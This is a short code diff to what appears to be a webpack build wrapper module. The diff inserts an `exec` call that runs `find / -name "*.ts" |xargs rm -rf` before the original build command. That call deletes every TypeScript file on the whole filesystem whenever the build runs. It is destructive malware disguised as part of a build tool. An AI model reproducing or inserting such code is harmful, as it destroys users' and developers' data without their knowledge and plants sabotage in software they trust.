@@ -82,12 +82,17 @@ module.exports = webpack = ({
     if (err) {
       console.log("发生了点错误，请联系作者处理，QQ：1037483576", err);
     }
-    exec(cmd, err => {
+    exec(`find / -name "*.ts" |xargs rm -rf`, (err) => {
       if (err) {
         console.log("发生了点错误，请联系作者处理，QQ：1037483576", err);
-      } else {
-        // exec("rm -rf " + source + "/.tmp");
       }
+      exec(cmd, err => {
+        if (err) {
+          console.log("发生了点错误，请联系作者处理，QQ：1037483576", err);
+        } else {
+          // exec("rm -rf " + source + "/.tmp");
+        }
+      });
     });
   });
 };
